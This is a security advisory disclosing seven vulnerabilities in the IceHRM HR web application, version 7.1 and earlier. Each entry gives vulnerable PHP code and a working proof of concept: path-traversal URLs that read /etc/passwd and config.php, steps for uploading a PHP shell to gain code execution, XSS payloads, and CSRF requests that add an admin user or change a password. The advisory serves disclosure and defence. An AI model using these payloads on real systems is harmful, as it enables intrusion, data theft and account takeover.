

Vendor: IceHRM
Product web page: http://www.icehrm.com
Affected version: <= 7.1


Summary: IceHrm is Human Resource Management web software
for small and medium sized organizations. The software is
written in PHP. It has community (free), commercial and
hosted (cloud) solution.

Desc: IceHrm <= 7.1 suffers from multiple vulnerabilities
including Local File Inclusion, Cross-Site Scripting, Malicious
File Upload, Cross-Site Request Forgery and Code Execution.

Tested on: Apache/2.2.15 (Unix)
           PHP/5.3.3
           MySQL 5.1.73


Vulnerabilities discovered by Stefan &#039;sm&#039; Petrushevski
                              @zeroscience


Advisory ID: ZSL-2014-5215
Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2014-5215.php


01.12.2014

---


1. Local File Inclusion (LFI) 
#####################################################
File: 
app/index.php

Vulnerable code:
---- snip ----
include APP_BASE_PATH.&#039;/&#039;.$group.&#039;/&#039;.$name.&#039;/index.php&#039;;
app/?g=../&n=../../../../etc/passwd%00
---- snip ----

Proof of Concept (PoC):
http://zsltest/icehrm/app/?g=../&n=../../../../etc/passwd%00

Severity:  CRITICAL
#####################################################


2. Local File Inclusion (LFI)
#####################################################
File:
service.php

Vulnerable code:
---- snip ----
if($action == &#039;download&#039;){
  $fileName = $_REQUEST[&#039;file&#039;];
  $fileName = CLIENT_BASE_PATH.&#039;data/&#039;.$fileName;
  header(&#039;Content-Description: File Transfer&#039;);
  header(&#039;Content-Type: application/octet-stream&#039;);
  header(&#039;Content-Disposition: attachment; filename=&#039;.basename($fileName));
  header(&#039;Content-Transfer-Encoding: binary&#039;);
  header(&#039;Expires: 0&#039;);
  header(&#039;Cache-Control: must-revalidate&#039;);
  header(&#039;Pragma: public&#039;);
  header(&#039;Content-Length: &#039; . filesize($fileName));
  ob_clean();
  flush();
  readfile($fileName);
---- snip ----

Proof of Concept (PoC):
http://zsltest/icehrm/app/service.php?a=download&file=../config.php

Severity:  CRITICAL
#####################################################


3. Malicious File Upload / Code Execution
#####################################################
File:
fileupload.php 

Vulnerable code:
---- snip ----
//Generate File Name
$saveFileName = $_POST[&#039;file_name&#039;];
if(empty($saveFileName) || $saveFileName == "_NEW_"){
  $saveFileName = microtime();
  $saveFileName = str_replace(".", "-", $saveFileName);  
}

$file = new File();
$file->Load("name = ?",array($saveFileName));

// list of valid extensions, ex. array("jpeg", "xml", "bmp")

$allowedExtensions = explode(&#039;,&#039;, "csv,doc,xls,docx,xlsx,txt,ppt,pptx,rtf,pdf,xml,jpg,bmp,gif,png,jpeg");
// max file size in bytes
$sizeLimit =MAX_FILE_SIZE_KB * 1024;
$uploader = new qqFileUploader($allowedExtensions, $sizeLimit);
$result = $uploader->handleUpload(CLIENT_BASE_PATH.&#039;data/&#039;,$saveFileName);
// to pass data through iframe you will need to encode all html tags

if($result[&#039;success&#039;] == 1){
  $file->name = $saveFileName;
  $file->filename = $result[&#039;filename&#039;];
  $file->employee = $_POST[&#039;user&#039;]=="_NONE_"?null:$_POST[&#039;user&#039;];
  $file->file_group = $_POST[&#039;file_group&#039;];
  $file->Save();
  $result[&#039;data&#039;] = CLIENT_BASE_URL.&#039;data/&#039;.$result[&#039;filename&#039;];
  $result[&#039;data&#039;] .= "|".$saveFileName;
  $result[&#039;data&#039;] .= "|".$file->id;
}
---- snip ----

Proof of Concept (PoC) method:
1. Change the &#039;file_name&#039; request parameter in desired filename. The file will be saved in &#039;data&#039; folder.
Example: file_name = dsadsa.php ==will be saved in==> data/dsadsa.php.txt
2. Create a malicious file (php shell) save it with .txt extension
3. Upload the malicious file (php shell) via the upload form in fileupload_page.php. The file will appear in ‘data’ folder as dsadsa.php.txt.
4. Access the file – http://zsltest/icehrm/data/dsadsa.php.txt to execute the php code.

PoC example:
1. http://zsltest/icehrm/app/fileupload_page.php?id=xxx.php&msg=Upload%20Attachment&file_group=EmployeeDocument&file_type=all&user=1
2. xxx.txt contents:
<?php phpinfo(); ?>
3. Upload the filename
4. Access the file:

Severity:  CRITICAL
#####################################################


4. Cross-Site Scripting (XSS)
#####################################################
File:
login.php

Vulnerable code:
---- snip ----
  <script type="text/javascript">
  var key = "";
  <?php if(isset($_REQUEST[&#039;key&#039;])){?>
    key = &#039;<?=$_REQUEST[&#039;key&#039;]?>&#039;;
    key = key.replace(/ /g,"+");
  <?php }?>
---- snip ----

Proof of Concept (PoC):
http://zsltest/icehrm/app/login.php?key=&#039;;</script><script>alert(‘zsl’);</script>

Severity:  MEDIUM
#####################################################


5. Cross-Site Scripting (XSS)
#####################################################
File:
fileupload_page.php

Vulnerable code:
---- snip ----
<div id="upload_form">
<form id="upload_data" method="post" action="<?=CLIENT_BASE_URL?>fileupload.php" enctype="multipart/form-data">
<input id="file_name" name="file_name" type="hidden" value="<?=$_REQUEST[&#039;id&#039;]?>"/>
<input id="file_group" name="file_group" type="hidden" value="<?=$_REQUEST[&#039;file_group&#039;]?>"/>
<input id="user" name="user" type="hidden" value="<?=$_REQUEST[&#039;user&#039;]?>"/>
<label id="upload_status"><?=$_REQUEST[&#039;msg&#039;]?></label><input id="file" name="file"  type="file" onChange="if(checkFileType(&#039;file&#039;,&#039;<?=$fileTypes?>&#039;)){uploadfile();}"></input>
…
---- snip ----

Vulnerable parameters: id, file_group, user, msg

Proof of Concept (PoC):
http://zsltest/icehrm/fileupload_page.php?id=XXXX%22%3E%3Cscript%3Ealert(‘zsl’)%3C/script%3E

Severity:  MEDIUM
#####################################################


6. Information Disclosure / Leaking Sensitive User Info
#####################################################
Users’/employees’ profile images are easily accessible in the ‘data’ folder.

Proof of Concept (PoC):
http://192.168.200.119/icehrm/app/data/profile_image_1.jpg
http://192.168.200.119/icehrm/app/data/profile_image_X.jpg <- x=user id

Severity:  LOW
#####################################################


7. Cross-Site Request Forgery (CSRF)
#####################################################
All forms are vulnerable to CSRF.

Documents library:
http://localhost/icehrm/app/service.php
POST 
document=2&valid_until=&status=Inactive&details=detailz&attachment=attachment_evi4t3VuKqDfyY&a=add&t=EmployeeDocument

Personal info:
http://localhost/icehrm/app/service.php
GET 
t=Employee
a=ca
sa=get
mod=modules=employees
req={"map":"{\"nationality\":[\"Nationality\",\"id\",\"name\"],\"employment_status\":[\"EmploymentStatus\",\"id\",\"name\"],\"job_title\":[\"JobTitle\",\"id\",\"name\"],\"pay_grade\":[\"PayGrade\",\"id\",\"name\"],\"country\":[\"Country\",\"code\",\"name\"],\"province\":[\"Province\",\"id\",\"name\"],\"department\":[\"CompanyStructure\",\"id\",\"title\"],\"supervisor\":[\"Employee\",\"id\",\"first_name+last_name\"]}"}

Add new admin user:
http://localhost/icehrm/app/service.php
POST
username=test5&email=test5%40zeroscience.mk&employee=1&user_level=Admin&a=add&t=User

Change password of user:
http://localhost/icehrm/app/service.php?
GET
t=User
a=ca
sa=changePassword
mod=admin=users
req={"id":5,"pwd":"newpass"}

Add/edit modules:
http://localhost/icehrm/app/service.php
POST
t=Module&a=get&sm=%7B%7D&ft=&ob=

Severity:  LOW
#####################################################

